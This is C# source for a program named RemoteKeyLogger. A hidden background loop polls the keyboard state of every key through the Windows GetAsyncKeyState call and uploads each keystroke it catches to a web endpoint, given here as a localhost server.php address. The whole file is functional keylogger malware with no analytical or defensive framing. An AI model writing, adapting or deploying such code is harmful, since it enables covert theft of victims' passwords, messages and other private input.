using System.Net;
using System.Runtime.InteropServices;

namespace RemoteKeyLogger
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public Form1()
        {
            InitializeComponent();

            Task.Run(() => Listen());
        }

        void Listen()
        {
            string server = "http://localhost/server.php";

            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767 || keyState == 32769)
                    {
                        char x = (char)i;

                        WebClient wb = new WebClient();
                        wb.UploadString(server, x.ToString());

                        break;
                    }
                }
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
